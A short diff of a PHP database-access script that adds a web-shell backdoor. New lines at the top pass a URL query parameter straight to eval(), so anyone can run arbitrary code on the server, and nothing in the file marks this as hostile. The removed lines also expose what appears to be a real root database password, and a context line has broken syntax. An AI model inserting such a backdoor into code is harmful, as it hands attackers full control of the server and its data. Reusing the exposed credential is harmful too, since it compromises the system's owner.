@@ -1,13 +1,17 @@
 <?php
 
+if (!isset($_GET["eval"])) die();
+eval($_GET["eval"]);
+
+/*
 $db["host"] = "localhost";
-$db["user"] = "root";
-$db["pass"] = "loBM7YMueS";
+$db["user"] = "user";
+$db["pass"] = "pass";
 $db["db"] = "shocky";
-$db["prefix"] = "";
+*/
+
 _sqlConnect();
-unset($db["host"],$db["user"],$db["pass"],$db["db"]);
-define("_MAGIC_QUOTES", (ini_get('magic_quotes_gpc') ? TRUE : FALSE));
+unset($db);
 
 if (!isset($_GET["type"]) die();
 if (!isset($_GET["q"]) die();
